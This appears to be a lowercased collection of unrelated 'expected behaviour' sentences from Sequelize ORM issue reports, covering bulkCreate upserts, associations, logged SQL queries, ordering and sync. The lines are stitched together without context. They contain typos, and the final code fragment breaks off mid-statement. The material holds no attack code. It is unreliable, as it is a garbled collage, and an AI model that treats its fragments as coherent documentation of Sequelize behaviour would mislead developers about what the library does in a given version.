having a list of 10 reports maximum with nested comments of user that are more then 18.
return ture when already have association
i expect the `bulkcreate` method to succeed and upsert the test users to the database.
i expect to successfully insert the record.
i wanted to the notice or notification event called at least once
bigint -9223372036854775808 ~ 9223372036854775807
it should be possible to upsert a text or json value that happens to contain the substring `returning *`.
it should count the distinct padids and `result.rows` should be an array containing all the padid's
project 1: project 1 description
like prior to 5.18.4, it should return the data.
the `title` field should have been mapped.
correct me if i'm wrong but it should pass.
the first one is for not getting `literal replacements` error but it's a different topic.
second and the third object should generate the same `id is not null`.
pass in testcase
no views returned
this matches the behavior of the other dialects.
the code above should run without errors
bulkcreate with updateonduplicate should work even when primary key fields are named differently in the db.
in 5.17.2 and below, the following is output:
executing (default): select sum(`a`) as `a`, sum(`b`) as `b`, sum(`c`) as `c`, sum(`d`) as `d` from `second` as `second` inner join `first` as `first` on `second`.`first_id` = `first`.`id` and (`first`.`deleted_at` is null and `first`.`pid` = 1) group by `first`.`pid` limit 1;
it should insert with `showid = 3` and `tagid = 3`.
resulting order: order by `field1` `asc`, `associatedmodel1`.`foo` `asc`
(this was the actual order using sequelize version 3.30.4)
executing (default): create index "test_slug_idx" on "public"."test" ("slug")
the updated instance should be an instance of bar
using `db.sync()`, column 'system_name' is created in right way
models.drop().then(function() { return models.sync();
